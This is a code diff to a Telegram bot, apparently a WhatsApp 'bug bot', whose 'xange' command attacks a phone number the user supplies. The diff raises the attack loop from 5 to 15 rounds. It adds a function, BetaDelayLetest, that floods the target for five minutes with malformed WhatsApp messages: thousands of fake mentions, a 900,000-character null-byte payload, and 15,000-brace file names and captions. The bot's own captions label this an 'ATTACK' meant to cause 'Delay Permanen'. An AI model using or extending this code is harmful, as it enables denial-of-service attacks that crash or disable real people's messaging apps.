@@ -2419,13 +2419,13 @@ bot.command("xange", checkAllPremium, checkWhatsAppConnection, checkCooldown, as
     {
       caption: `
 <blockquote><pre>GXION INFORMATION ATTACK</pre></blockquote>
-⌑ Target : ${q}
-⌑ Type : Delay Permanen 
-⌑ Status : Process`,
+⌑ 🪧Target : ${q}
+⌑ 🛡️Type : Delay Permanen 
+⌑ 🚀Status : Process`,
       parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: [[
-          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
+          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}`, style: "success" }
         ]]
       }
     }
@@ -2433,9 +2433,12 @@ bot.command("xange", checkAllPremium, checkWhatsAppConnection, checkCooldown, as
 
   const processMessageId = processMessage.message_id;
 
-    for (let r = 0; r < 5; r++) {
+    for (let r = 0; r < 15; r++) {
     await OneRxVz(sock, target);
-    await sleep(800)
+    await sleep(1000)
+    
+    await BetaDelayLetest(sock, target);
+    await sleep(2000)
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2444,9 +2447,9 @@ bot.command("xange", checkAllPremium, checkWhatsAppConnection, checkCooldown, as
     undefined,
     `
 <blockquote><pre>GXION INFORMATION ATTACK</pre></blockquote>
-⌑ Target : ${q}
-⌑ Type : Delay Permanen
-⌑ Status : Success`,
+⌑ 🪧Target : ${q}
+⌑ 🛡️Type : Delay Permanen
+⌑ 🚀Status : Success`,
     {
       parse_mode: "HTML",
       reply_markup: {
@@ -2968,6 +2971,58 @@ async function OneRxVz(sock, target) {
             await new Promise(resolve => setTimeout(resolve, 1000));
         }
     }
+}
+
+async function BetaDelayLetest(sock, target) {
+  const endTime = Date.now() + 5 * 60 * 1000;
+  while (Date.now() < endTime) {
+    const VSX = generateWAMessageFromContent(target, {
+      interactiveResponseMessage: {
+        contextInfo: {
+          mentionedJid: Array.from({ length: 3000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
+        },
+        body: {
+          text: "\u0000",
+          format: "DEFAULT"
+        },
+        nativeFlowResponseMessage: {
+          name: "call_permission_request",
+          paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`,
+          version: 3
+        }
+      }
+    }, {});
+
+    const Msg2 = {
+      imageMessage: {
+        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNVnslgv6Jf-Ds8txkkxuSRpYvf5Z90wTFW9sckqasGPw9ptkZG0UAvevehFFaxMX8v-AXmp7Y-nmsgVARPbTJS5h6Ptqjrz9lKEwwJ1w?ccb=9-4&oh=01_Q5Aa4AHNwqyPGFy0xs2dCd33ES63-jXD7QfvMVR23ujCnRGvQw&oe=69E63AB6&_nc_sid=e6ed6c&mms3=true",
+        mediaKey: "9d8P7h7k9YwatbqsKHdjtxBiVK60Ni0KEI15y6XgfXg=",
+        fileEncSha256: "PkwUABcpAe/uY5vNO2qR7enHrUIAPXeR2y3bf1GdWEw=",
+        fileSha256: "4HO/zT+dMf6BHN53zwBT/nDudFJegcu0sBAbiq/BBis=",
+        fileLength: 28650,
+        directPath: "/o1/v/t24/f2/m235/AQNVnslgv6Jf-Ds8txkkxuSRpYvf5Z90wTFW9sckqasGPw9ptkZG0UAvevehFFaxMX8v-AXmp7Y-nmsgVARPbTJS5h6Ptqjrz9lKEwwJ1w?ccb=9-4&oh=01_Q5Aa4AHNwqyPGFy0xs2dCd33ES63-jXD7QfvMVR23ujCnRGvQw&oe=69E63AB6&_nc_sid=e6ed6c",
+        mimetype: "image/jpeg",
+        width: 600,
+        height: 600,
+        fileName: "{".repeat(15000),
+        caption: "{".repeat(15000)
+      }
+    };
+    
+    await sock.relayMessage(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: {
+            ...VSX.message,
+            ...Msg2
+          }
+        }
+      },
+      {}
+    );
+    await new Promise(resolve => setTimeout(resolve, 100)); 
+  }
 }
 
 async function fvckmklu(sock, target) {
